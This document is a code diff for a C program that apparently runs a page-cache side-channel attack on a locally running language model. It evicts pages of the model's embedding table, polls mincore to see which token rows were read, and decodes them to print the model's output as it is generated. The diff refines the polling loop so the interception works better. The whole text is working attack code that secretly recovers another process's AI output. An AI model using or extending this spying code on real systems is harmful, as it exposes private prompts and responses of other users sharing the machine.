@@ -176,75 +176,63 @@ int main(int argc, char* argv[])
     fprintf(stderr, "flushing page cache for %s\n", EVT_PATH);
     #endif
 
-    // for (int i = 0; i < VOCAB_SIZE; i++)
-    // {
-    //     madvise(map + (long)i * PAGE_SIZE, PAGE_SIZE, MADV_DONTNEED);
-    // }
-    posix_fadvise(evt_fd, 0, 0, POSIX_FADV_DONTNEED);
+    for (int i = 0; i < VOCAB_SIZE; i++)
+    {
+        madvise(map + (long)i * PAGE_SIZE, PAGE_SIZE, MADV_DONTNEED);
+    }
+    // posix_fadvise(evt_fd, 0, 0, POSIX_FADV_DONTNEED);
 
     #if TRACE_TO_STDERR
     fprintf(stderr, "starting intercepting\n");
     #endif
 
-    int iteration = 0;
-    int prev_token = 1;
+    int prev_token = -1;
+    unsigned char* vec = malloc(VOCAB_SIZE);
+    if (vec == NULL)
+    {
+        goto clean;
+    }
 
     double last_token_time = now_seconds();
 
     while (1)
     {
-        posix_fadvise(evt_fd, 0, 0, POSIX_FADV_DONTNEED);
-        // probe the embedding vector table
-        for (int i = 0; i < VOCAB_SIZE; i++)
-        {
-            int cur_token = i;
-            char* page_addr = map + (long)i * PAGE_SIZE;
-            unsigned char vec[1]; // mincore result vector
-
-            if (mincore(page_addr, PAGE_SIZE, vec) == 0)
-            {
-                // LSB of the first byte indicates if the page is present in the page cache
-                if (vec[0] & 1)
-                {
-                    #if TRACE_TO_STDERR
-                    fprintf(stderr, "------------------------------------------------- iteration %4d\n", iteration);
-                    fprintf(stderr, "[%5d] token:%5d | prev_token:%5d  (%s)\n", i, cur_token, prev_token, cur_token == prev_token ? "ignored" : "decoded");
-                    #endif
-                    char* token_str = decode(&tokenizer, prev_token, cur_token);
-
-                    if (i != 1 && token_str != NULL && cur_token != prev_token)
-                    {
-                        safe_printf(token_str);
-                        fflush(stdout);
-                        // record the timestamp of when we got the last token
-                        last_token_time = now_seconds();
-                        #if TRACE_TO_STDERR
-                        fprintf(stderr, "decoded token: %s\n", token_str);
-                        #endif
-                    }
-
-                    prev_token = cur_token;
-                    madvise(page_addr, PAGE_SIZE, MADV_DONTNEED);
-                }
-            }
-        }
-
-        // check if we should exit
-        double current_time = now_seconds();
-        if (current_time - last_token_time > exit_timeout)
+        if (mincore(map, file_size, vec) != 0)
         {
             #if TRACE_TO_STDERR
-            fprintf(stderr, "no new tokens for %.2f seconds, exiting...\n", current_time - last_token_time);
+            fprintf(stderr, "mincore failed, exiting...\n");
             #endif
             break;
         }
 
-        iteration++;
+        for (int i = 0; i < VOCAB_SIZE; i++)
+        {
+            if ((vec[i] & 1) && (i != prev_token))
+            {
+                char* token_str = decode(&tokenizer, prev_token, i);
+                if (i != 1 && token_str != NULL && i != prev_token)
+                {
+                    safe_printf(token_str);
+                    fflush(stdout);
+                }
+
+                prev_token = i;
+                last_token_time = now_seconds();
+
+                madvise(map + (long)i * PAGE_SIZE, PAGE_SIZE, MADV_DONTNEED);
+            }
+        }
+
+        if (now_seconds() - last_token_time > exit_timeout)
+        {
+            break;
+        }
     }
 
     printf("\n");
 
 clean:
+    free(vec);
     free_tokenizer(&tokenizer);
     if (map != MAP_FAILED)
     {
